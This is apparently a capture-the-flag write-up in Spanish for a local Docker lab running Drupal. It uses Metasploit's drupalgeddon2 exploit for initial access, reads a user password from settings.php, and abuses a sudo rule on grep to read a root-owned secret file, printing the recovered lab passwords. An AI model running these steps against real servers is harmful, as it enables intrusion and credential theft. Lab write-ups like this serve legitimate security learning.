## Reconcimiento:

Puerto 80 : HTTP

En la web hay un servicio Drupal. Intento fuzzing de directorios y no encuentro nada interesante.

Pruebo directamente con Metasploit:

```bash
msfconsole
search Drupal
use exploit/unix/webapp/drupal_drupalgeddon2
```

Luego lo configuro:

```bash
set RHOSTS 172.17.0.2
exploit
```

## Escalada www-data → ballenita

Luego de estar un rato buscando encuentro algo interesante:

```bash
cd /var/www/html/sites/default
```

Hay un archivo con configuraciones de Drupal:

```bash
cat settings.php
```

Encuentro el pass de ballenita : ballenitafeliz

## Escalada ballenita → root

```bash
sudo -l
(root) NOPASSWD: /bin/ls, /bin/grep
```

Primero uso ls en el directorio root:

```bash
sudo ls /root
# Info:
secretitomaximo.txt
```

Y uso grep de la siguiente forma:

```bash
LFILE=/root/secretitomaximo.txt
sudo grep '' $LFILE
# Info:
nobodycanfindthispasswordrootrocks
```

Listo.
